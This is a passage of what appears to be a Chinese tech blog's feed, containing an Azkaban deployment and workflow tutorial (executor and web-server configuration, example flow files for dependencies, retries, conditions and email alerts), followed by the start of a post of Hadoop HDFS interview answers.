/opt/module/azkaban/azkaban-exec/conf/azkaban.properties</span><br><span class="line"><span class="comment"># 修改如下属性</span></span><br><span class="line"><span class="comment">#...</span></span><br><span class="line">default.timezone.id=Asia/Shanghai</span><br><span class="line"><span class="comment">#...</span></span><br><span class="line">azkaban.webserver.url=http://hadoop102:8081</span><br><span class="line"></span><br><span class="line">executor.port=12321</span><br><span class="line"><span class="comment">#...</span></span><br><span class="line">database.type=mysql</span><br><span class="line">mysql.port=3306</span><br><span class="line">mysql.host=hadoop102</span><br><span class="line">mysql.database=azkaban</span><br><span class="line">mysql.user=azkaban</span><br><span class="line">mysql.password=000000</span><br><span class="line">mysql.numconnections=100</span><br><span class="line"></span><br><span class="line"><span class="comment"># 同步azkaban-exec到所有节点</span></span><br><span class="line">xsync /opt/module/azkaban/azkaban-exec</span><br><span class="line"><span class="comment"># 必须进入到/opt/module/azkaban/azkaban-exec路径，分别在三台机器上，启动executor server</span></span><br><span class="line">bin/start-exec.sh</span><br><span class="line">bin/start-exec.sh</span><br><span class="line">bin/start-exec.sh</span><br><span class="line"><span class="comment"># 注意：如果在/opt/module/azkaban/azkaban-exec目录下出现executor.port文件，说明启动成功</span></span><br><span class="line"><span class="comment"># 下面激活executor，需要分别在三台机器依次执行</span></span><br><span class="line">curl -G <span class="string">"hadoop102:12321/executor?action=activate"</span> &amp;&amp; <span class="built_in">echo</span></span><br><span class="line">curl -G <span class="string">"hadoop103:12321/executor?action=activate"</span> &amp;&amp; <span class="built_in">echo</span></span><br><span class="line">curl -G <span class="string">"hadoop104:12321/executor?action=activate"</span> &amp;&amp; <span class="built_in">echo</span></span><br><span class="line"><span class="comment"># 如果三台机器都出现如下提示，则表示激活成功</span></span><br><span class="line">&#123;<span class="string">"status"</span>:<span class="string">"success"</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="1-3-配置Web-Server">1.3 配置Web Server</h3><p>Azkaban Web Server处理项目管理，身份验证，计划和执行触发</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编辑azkaban.properties</span></span><br><span class="line">vim /opt/module/azkaban/azkaban-web/conf/azkaban.properties</span><br><span class="line"><span class="comment"># 修改如下属性</span></span><br><span class="line">...</span><br><span class="line">default.timezone.id=Asia/Shanghai</span><br><span class="line">...</span><br><span class="line">database.type=mysql</span><br><span class="line">mysql.port=3306</span><br><span class="line">mysql.host=hadoop102</span><br><span class="line">mysql.database=azkaban</span><br><span class="line">mysql.user=azkaban</span><br><span class="line">mysql.password=000000</span><br><span class="line">mysql.numconnections=100</span><br><span class="line">...</span><br><span class="line">azkaban.executorselector.filters=StaticRemainingFlowSize,CpuStatus</span><br><span class="line"></span><br><span class="line"><span class="comment"># 说明：</span></span><br><span class="line"><span class="comment"># StaticRemainingFlowSize：正在排队的任务数；</span></span><br><span class="line"><span class="comment"># CpuStatus：CPU占用情况</span></span><br><span class="line"><span class="comment"># MinimumFreeMemory：内存占用情况。测试环境，必须将MinimumFreeMemory删除掉，否则它会认为集群资源不够，不执行。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改azkaban-users.xml文件，添加atguigu用户</span></span><br><span class="line">vim /opt/module/azkaban/azkaban-web/conf/azkaban-users.xml</span><br><span class="line">&lt;azkaban-users&gt;</span><br><span class="line">  &lt;user groups=<span class="string">"azkaban"</span> password=<span class="string">"azkaban"</span> roles=<span class="string">"admin"</span> username=<span class="string">"azkaban"</span>/&gt;</span><br><span class="line">  &lt;user password=<span class="string">"metrics"</span> roles=<span class="string">"metrics"</span> username=<span class="string">"metrics"</span>/&gt;</span><br><span class="line">  &lt;user password=<span class="string">"atguigu"</span> roles=<span class="string">"admin"</span> username=<span class="string">"atguigu"</span>/&gt;</span><br><span class="line">  &lt;role name=<span class="string">"admin"</span> permissions=<span class="string">"ADMIN"</span>/&gt;</span><br><span class="line">  &lt;role name=<span class="string">"metrics"</span> permissions=<span class="string">"METRICS"</span>/&gt;</span><br><span class="line">&lt;/azkaban-users&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 必须进入到hadoop102的/opt/module/azkaban/azkaban-web路径，启动web server</span></span><br><span class="line">bin/start-web.sh</span><br><span class="line"><span class="comment"># 访问http://hadoop102:8081,并用atguigu用户登陆</span></span><br></pre></td></tr></table></figure><h2 id="2、Work-Flow案例实操">2、Work Flow案例实操</h2><h3 id="2-1-HelloWorld案例">2.1 HelloWorld案例</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在windows环境，新建azkaban.project文件，编辑内容如下</span></span><br><span class="line"><span class="comment"># 注意：该文件作用，是采用新的Flow-API方式解析flow文件</span></span><br><span class="line">azkaban-flow-version: 2.0</span><br><span class="line"><span class="comment"># 新建basic.flow文件，内容如下</span></span><br><span class="line">nodes:</span><br><span class="line">  - name: jobA</span><br><span class="line">    <span class="built_in">type</span>: <span class="built_in">command</span></span><br><span class="line">    config:</span><br><span class="line">      <span class="built_in">command</span>: <span class="built_in">echo</span> <span class="string">"Hello World"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Name：job名称</span></span><br><span class="line"><span class="comment"># Type：job类型。command表示你要执行作业的方式为命令</span></span><br><span class="line"><span class="comment"># Config：job配置</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将azkaban.project、basic.flow文件压缩到一个zip文件，文件名称必须是英文</span></span><br><span class="line"><span class="comment"># 在WebServer新建项目：http://hadoop102:8081/index</span></span><br><span class="line"><span class="comment"># 然后上传压缩文件，执行，查看日志</span></span><br></pre></td></tr></table></figure><h3 id="2-2-作业依赖案例">2.2 作业依赖案例</h3><p>需求：JobA和JobB执行完了，才能执行JobC</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改basic.flow为如下内容</span></span><br><span class="line">nodes:</span><br><span class="line">  - name: jobC</span><br><span class="line">    <span class="built_in">type</span>: <span class="built_in">command</span></span><br><span class="line">    <span class="comment"># jobC 依赖 JobA和JobB</span></span><br><span class="line">    dependsOn:</span><br><span class="line">      - jobA</span><br><span class="line">      - jobB</span><br><span class="line">    config:</span><br><span class="line">      <span class="built_in">command</span>: <span class="built_in">echo</span> <span class="string">"I’m JobC"</span></span><br><span class="line"></span><br><span class="line">  - name: jobA</span><br><span class="line">    <span class="built_in">type</span>: <span class="built_in">command</span></span><br><span class="line">    config:</span><br><span class="line">      <span class="built_in">command</span>: <span class="built_in">echo</span> <span class="string">"I’m JobA"</span></span><br><span class="line"></span><br><span class="line">  - name: jobB</span><br><span class="line">    <span class="built_in">type</span>: <span class="built_in">command</span></span><br><span class="line">    config:</span><br><span class="line">      <span class="built_in">command</span>: <span class="built_in">echo</span> <span class="string">"I’m JobB"</span></span><br></pre></td></tr></table></figure><h3 id="2-3-自动失败重试案例">2.3 自动失败重试案例</h3><p>需求：如果执行任务失败，需要重试3次，重试的时间间隔10000ms</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nodes:</span><br><span class="line">  - name: JobA</span><br><span class="line">    <span class="built_in">type</span>: <span class="built_in">command</span></span><br><span class="line">    config:</span><br><span class="line">      <span class="built_in">command</span>: sh /not_exists.sh</span><br><span class="line">      retries: 3</span><br><span class="line">      retry.backoff: 10000</span><br></pre></td></tr></table></figure><p>也可以在Flow全局配置中添加任务失败重试配置，此时重试配置会应用到所有Job</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">config:</span><br><span class="line">  retries: 3</span><br><span class="line">  retry.backoff: 10000</span><br><span class="line">nodes:</span><br><span class="line">  - name: JobA</span><br><span class="line">    <span class="built_in">type</span>: <span class="built_in">command</span></span><br><span class="line">    config:</span><br><span class="line">      <span class="built_in">command</span>: sh /not_exists.sh</span><br></pre></td></tr></table></figure><h3 id="2-4-手动失败重试案例">2.4 手动失败重试案例</h3><p>需求：JobA⇒JobB（依赖于A）⇒JobC⇒JobD⇒JobE⇒JobF。生产环境，任何Job都有可能挂掉，可以根据需求执行想要执行的Job。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">nodes:</span><br><span class="line">  - name: JobA</span><br><span class="line">    <span class="built_in">type</span>: <span class="built_in">command</span></span><br><span class="line">    config:</span><br><span class="line">      <span class="built_in">command</span>: <span class="built_in">echo</span> <span class="string">"This is JobA."</span></span><br><span class="line"></span><br><span class="line">  - name: JobB</span><br><span class="line">    <span class="built_in">type</span>: <span class="built_in">command</span></span><br><span class="line">    dependsOn:</span><br><span class="line">      - JobA</span><br><span class="line">    config:</span><br><span class="line">      <span class="built_in">command</span>: <span class="built_in">echo</span> <span class="string">"This is JobB."</span></span><br><span class="line"></span><br><span class="line">  - name: JobC</span><br><span class="line">    <span class="built_in">type</span>: <span class="built_in">command</span></span><br><span class="line">    dependsOn:</span><br><span class="line">      - JobB</span><br><span class="line">    config:</span><br><span class="line">      <span class="built_in">command</span>: <span class="built_in">echo</span> <span class="string">"This is JobC."</span></span><br><span class="line"></span><br><span class="line">  - name: JobD</span><br><span class="line">    <span class="built_in">type</span>: <span class="built_in">command</span></span><br><span class="line">    dependsOn:</span><br><span class="line">      - JobC</span><br><span class="line">    config:</span><br><span class="line">      <span class="built_in">command</span>: <span class="built_in">echo</span> <span class="string">"This is JobD."</span></span><br><span class="line"></span><br><span class="line">  - name: JobE</span><br><span class="line">    <span class="built_in">type</span>: <span class="built_in">command</span></span><br><span class="line">    dependsOn:</span><br><span class="line">      - JobD</span><br><span class="line">    config:</span><br><span class="line">      <span class="built_in">command</span>: <span class="built_in">echo</span> <span class="string">"This is JobE."</span></span><br><span class="line"></span><br><span class="line">  - name: JobF</span><br><span class="line">    <span class="built_in">type</span>: <span class="built_in">command</span></span><br><span class="line">    dependsOn:</span><br><span class="line">      - JobE</span><br><span class="line">    config:</span><br><span class="line">      <span class="built_in">command</span>: <span class="built_in">echo</span> <span class="string">"This is JobF."</span></span><br></pre></td></tr></table></figure><p>在可视化界面，Enable和Disable下面都分别有如下参数：</p><ul><li>Parents：该作业的上一个任务</li><li>Ancestors：该作业前的所有任务</li><li>Children：该作业后的一个任务</li><li>Descendents：该作业后的所有任务</li><li>Enable All：所有的任务</li></ul><h2 id="3、JavaProcess作业类型案例">3、JavaProcess作业类型案例</h2><h3 id="3-1-概述">3.1 概述</h3><p>JavaProcess类型可以运行一个自定义主类方法，type类型为javaprocess，可用的配置为：</p><ul><li>Xms：最小堆</li><li>Xmx：最大堆</li><li>classpath：类路径</li><li>java.class：要运行的Java对象，其中必须包含Main方法</li><li>main.args：main方法的参数</li></ul><h3 id="3-2-案例">3.2 案例</h3><p>新建一个azkaban的maven工程，然后创建包名：com.atguigu，创建AzTest类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AzTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"This is for testing!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打包成jar包azkaban-1.0-SNAPSHOT.jar，新建testJava.flow，内容如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nodes:</span><br><span class="line">  - name: test_java</span><br><span class="line">    <span class="built_in">type</span>: javaprocess</span><br><span class="line">    config:</span><br><span class="line">      Xms: 96M</span><br><span class="line">      Xmx: 200M</span><br><span class="line">      java.class: com.atguigu.AzTest</span><br></pre></td></tr></table></figure><p>**将Jar包、flow文件和project文件打包成javatest.zip **，然后上传执行</p><h2 id="4、条件工作流案例">4、条件工作流案例</h2><h3 id="4-1-概述">4.1 概述</h3><p>条件工作流功能允许用户自定义执行条件来决定是否运行某些Job。条件可以由当前Job的父Job输出的运行时参数构成，也可以使用预定义宏。在这些条件下，用户可以在确定Job执行逻辑时获得更大的灵活性，例如，只要父Job之一成功，就可以运行当前Job</p><h3 id="4-2-运行时参数案例">4.2 运行时参数案例</h3><p><strong>基本原理</strong>：父Job将参数写入<code>JOB_OUTPUT_PROP_FILE</code>环境变量所指向的文件；子Job使用 <code>${jobName:param}</code>来获取父Job输出的参数并定义执行条件</p><p><strong>支持的条件运算符</strong>：</p><p>（1）== 等于</p><p>（2）!= 不等于</p><p>（3）&gt; 大于</p><p>（4）&gt;= 大于等于</p><p>（5）&lt; 小于</p><p>（6）&lt;= 小于等于</p><p>（7）&amp;&amp; 与</p><p>（8）|| 或</p><p>（9）! 非</p><p><strong>需求分析：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># JobA执行一个shell脚本。</span></span><br><span class="line"><span class="comment"># JobB执行一个shell脚本，但JobB不需要每天都执行，而只需要每个周一执行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建JobA.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"do JobA"</span></span><br><span class="line">wk=`date +%w`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&#123;\"wk\":<span class="variable">$wk</span>&#125;"</span> &gt; <span class="variable">$JOB_OUTPUT_PROP_FILE</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建JobB.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"do JobB"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建condition.flow</span></span><br><span class="line">nodes:</span><br><span class="line"> - name: JobA</span><br><span class="line">   <span class="built_in">type</span>: <span class="built_in">command</span></span><br><span class="line">   config:</span><br><span class="line">     <span class="built_in">command</span>: sh JobA.sh</span><br><span class="line"></span><br><span class="line"> - name: JobB</span><br><span class="line">   <span class="built_in">type</span>: <span class="built_in">command</span></span><br><span class="line">   dependsOn:</span><br><span class="line">     - JobA</span><br><span class="line">   config:</span><br><span class="line">     <span class="built_in">command</span>: sh JobB.sh</span><br><span class="line">   condition: <span class="variable">$&#123;JobA:wk&#125;</span> == 1</span><br><span class="line">   </span><br><span class="line"><span class="comment"># 最后将JobA.sh、JobB.sh、condition.flow和azkaban.project打包成condition.zip</span></span><br></pre></td></tr></table></figure><h3 id="4-3-预定义宏案例">4.3 预定义宏案例</h3><p>Azkaban中预置了几个特殊的判断条件，称为预定义宏。预定义宏会根据所有父Job的完成情况进行判断，再决定是否执行。可用的预定义宏如下：</p><p>（1）all_success: 表示父Job全部成功才执行(默认)</p><p>（2）all_done：表示父Job全部完成才执行</p><p>（3）all_failed：表示父Job全部失败才执行</p><p>（4）one_success：表示父Job至少一个成功才执行</p><p>（5）one_failed：表示父Job至少一个失败才执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 需求</span></span><br><span class="line"><span class="comment"># JobA执行一个shell脚本</span></span><br><span class="line"><span class="comment"># JobB执行一个shell脚本</span></span><br><span class="line"><span class="comment"># JobC执行一个shell脚本，要求JobA、JobB中有一个成功即可执行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建JobA.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"do JobA"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建JobC.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"do JobC"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建macro.flow</span></span><br><span class="line">nodes:</span><br><span class="line"> - name: JobA</span><br><span class="line">   <span class="built_in">type</span>: <span class="built_in">command</span></span><br><span class="line">   config:</span><br><span class="line">     <span class="built_in">command</span>: sh JobA.sh</span><br><span class="line"></span><br><span class="line"> - name: JobB</span><br><span class="line">   <span class="built_in">type</span>: <span class="built_in">command</span></span><br><span class="line">   config:</span><br><span class="line">     <span class="built_in">command</span>: sh JobB.sh</span><br><span class="line"></span><br><span class="line"> - name: JobC</span><br><span class="line">   <span class="built_in">type</span>: <span class="built_in">command</span></span><br><span class="line">   dependsOn:</span><br><span class="line">     - JobA</span><br><span class="line">     - JobB</span><br><span class="line">   config:</span><br><span class="line">     <span class="built_in">command</span>: sh JobC.sh</span><br><span class="line">   condition: one_success</span><br></pre></td></tr></table></figure><h2 id="5、邮箱告警">5、邮箱告警</h2><p>首先申请好邮箱，然后配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在azkaban-web节点hadoop102上，编辑/opt/module/azkaban/azkaban-web/conf/azkaban.properties，修改如下内容</span></span><br><span class="line">vim /opt/module/azkaban/azkaban-web/conf/azkaban.properties</span><br><span class="line"><span class="comment"># 添加如下内容：</span></span><br><span class="line"><span class="comment">#这里设置邮件发送服务器，需要 申请邮箱，切开通stmp服务，以下只是例子</span></span><br><span class="line">mail.sender=atguigu@126.com</span><br><span class="line">mail.host=smtp.126.com</span><br><span class="line">mail.user=atguigu@126.com</span><br><span class="line">mail.password=用邮箱的授权码</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存并重启web-server</span></span><br><span class="line">bin/shutdown-web.sh</span><br><span class="line">bin/start-web.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编辑basic.flow</span></span><br><span class="line">nodes:</span><br><span class="line">  - name: jobA</span><br><span class="line">    <span class="built_in">type</span>: <span class="built_in">command</span></span><br><span class="line">    config:</span><br><span class="line">      <span class="built_in">command</span>: <span class="built_in">echo</span> <span class="string">"This is an email test."</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将azkaban.project和basic.flow压缩成email.zip</span></span><br><span class="line"><span class="comment"># 然后上传，在可视化页面里选择邮箱告警</span></span><br><span class="line"><span class="comment"># 针对电话告警，可以使用睿象云，https://www.aiops.com/</span></span><br></pre></td></tr></table></figure><h2 id="6、Azkaban多Executor模式注意事项">6、Azkaban多Executor模式注意事项</h2><p>Azkaban多Executor模式是指，在集群中多个节点部署Executor。在这种模式下， <strong>Azkaban web Server会根据策略，选取其中一个Executor去执行任务</strong>。为确保所选的Executor能够准确的执行任务，我们须在以下两种方案任选其一，推荐使用方案二。</p><p>方案一：指定特定的Executor（hadoop102）去执行任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在MySQL中azkaban数据库executors表中，查询hadoop102上的Executor的id</span></span><br><span class="line"></span><br><span class="line">mysql&gt; use azkaban;</span><br><span class="line">mysql&gt; select * from executors;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在执行工作流程时选择Flow Parameters加入useExecutor属性</span></span><br></pre></td></tr></table></figure><p>方案二：在Executor所在所有节点部署任务所需脚本和应用</p><p>官网文档：<a href="https://azkaban.readthedocs.io/en/latest/configuration.html" target="_blank" rel="noopener" title="https://azkaban.readthedocs.io/en/latest/configuration.html">https://azkaban.readthedocs.io/en/latest/configuration.html</a></p>]]></content>
    
    
    <summary type="html">&lt;h1&gt;一、DolphinScheduler概述和部署&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;官网：&lt;a href=&quot;https://dolphinscheduler.apache.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; title=&quot;https://dolphinscheduler.apache.org/&quot;&gt;https://dolphinscheduler.apache.org/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;1、DolphinScheduler简介&quot;&gt;1、DolphinScheduler简介&lt;/h2&gt;
&lt;h3 id=&quot;1-1-概述&quot;&gt;1.1 概述&lt;/h3&gt;
&lt;p&gt;Apache DolphinScheduler是一个分布式、易扩展的可视化DAG工作流任务调度平台。致力于解决数据处理流程中错综复杂的依赖关系，使调度系统在数据处理流程中开箱即用&lt;/p&gt;</summary>
    
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
  </entry>
  
  <entry>
    <title>大数据大厂面试题</title>
    <link href="https://blog.shawncoding.top/posts/fc0b448c.html"/>
    <id>https://blog.shawncoding.top/posts/fc0b448c.html</id>
    <published>2024-05-31T08:22:50.000Z</published>
    <updated>2024-05-31T08:33:55.353Z</updated>
    
    <content type="html"><![CDATA[<h1>一、Hadoop大厂面试真题</h1><h3 id="1、请说下HDFS读写流程">1、请说下HDFS读写流程</h3><p><strong>HDFS写流程</strong>：</p><ol><li>Client客户端发送上传请求，<strong>通过RPC与NameNode建立通信</strong>，NameNode检查该用户是否有上传权限，以及上传的文件是否在HDFS对应的目录下重名，如果这两者有任意一个不满足，则直接报错，如果两者都满足，则返回给客户端一个可以上传的信息；</li><li>Client根据文件的大小进行切分，默认128M一块，切分完成之后给NameNode发送请求第一个block块上传到哪些服务器上；</li><li>NameNode收到请求之后，根据网络拓扑和机架感知以及副本机制进行文件分配，返回可用的DataNode的地址；</li></ol><a id="more"></a><blockquote><p>注：Hadoop在设计时考虑到数据的安全与高效, <strong>数据文件默认在HDFS上存放三份, 存储策略为本地一份，同机架内其它某一节点上一份, 不同机架的某一节点上一份</strong>。</p></blockquote><ol><li>客户端收到地址之后与服务器地址列表中的一个节点如A进行通信，本质上就是RPC调用，建立pipeline，A收到请求后会继续调用B，B在调用C，将整个pipeline建立完成，逐级返回Client；</li><li>Client开始向A上发送第一个block（<strong>先从磁盘读取数据然后放到本地内存缓存</strong>），<strong>以packet（数据包，64kb）为单位，A收到一个packet就会发送给B，然后B发送给C，A每传完一个packet就会放入一个应答队列等待应答</strong>；</li><li>数据被分割成一个个的packet数据包在pipeline上依次传输，<strong>在pipeline反向传输中，逐个发送ack（命令正确应答）</strong>，最终由pipeline中第一个DataNode节点A将pipelineack发送给Client；</li><li>当一个block传输完成之后, Client再次请求NameNode上传第二个block，NameNode重新选择三台DataNode给Client。</li></ol><p><strong>HDFS读流程</strong>：</p><ol><li>Client向NameNode发送RPC请求。请求文件block的位置；</li><li>NameNode收到请求之后会检查用户权限以及是否有这个文件，如果都符合，则会视情况返回部分或全部的block列表，对于每个block，NameNode都会返回含有该block副本的DataNode地址；这些返回的DataNode地址，会按照集群拓扑结构得出DataNode与客户端的距离，然后进行排序，<strong>排序两个规则</strong>：网络拓扑结构中距离 Client 近的排靠前；心跳机制中超时汇报的DataNode状态为STALE，这样的排靠后；</li><li>Client选取排序靠前的DataNode来读取block，如果客户端本身就是DataNode,那么将从本地直接获取数据(<strong>短路读取特性</strong>)；</li><li>底层上本质是建立Socket Stream（FSDataInputStream），重复的调用父类DataInputStream的read方法，直到这个块上的数据读取完毕；</li><li>当读完列表的block后，若文件读取还没有结束，客户端会继续向NameNode 获取下一批的block列表；</li><li><strong>读取完一个block都会进行checksum验证</strong>，如果读取DataNode时出现错误，客户端会通知NameNode，然后再从下一个拥有该block副本的DataNode 继续读；</li><li><strong>read方法是并行的读取block信息，不是一块一块的读取</strong>；NameNode只是返回Client请求包含块的DataNode地址，<strong>并不是返回请求块的数据</strong>；</li><li>最终读取来所有的block会合并成一个完整的最终文件</li></ol><h3 id="2、HDFS在读取文件的时候，如果其中一个块突然损坏了怎么办">2、HDFS在读取文件的时候，如果其中一个块突然损坏了怎么办</h3><p>客户端读取完DataNode上的块之后会进行checksum验证，也就是把客户端读取到本地的块与HDFS上的原始块进行校验，如果发现校验结果不一致，客户端会通知NameNode，然后再<strong>从下一个拥有该block副本的DataNode继续读</strong></p><h3 id="3、HDFS在上传文件的时候，如果其中一个DataNode突然挂掉了怎么办">3、HDFS在上传文件的时候，如果其中一个DataNode突然挂掉了怎么办</h3><p>客户端上传文件时与DataNode建立pipeline管道，管道的正方向是客户端向DataNode发送的数据包，管道反向是DataNode向客户端发送ack确认，也就是正确接收到数据包之后发送一个已确认接收到的应答。</p><p>当DataNode突然挂掉了，客户端接收不到这个DataNode发送的ack确认，客户端会通知NameNode，NameNode检查该块的副本与规定的不符，NameNode会通知DataNode去复制副本，并将挂掉的DataNode作下线处理，不再让它参与文件上传与下载。</p><h3 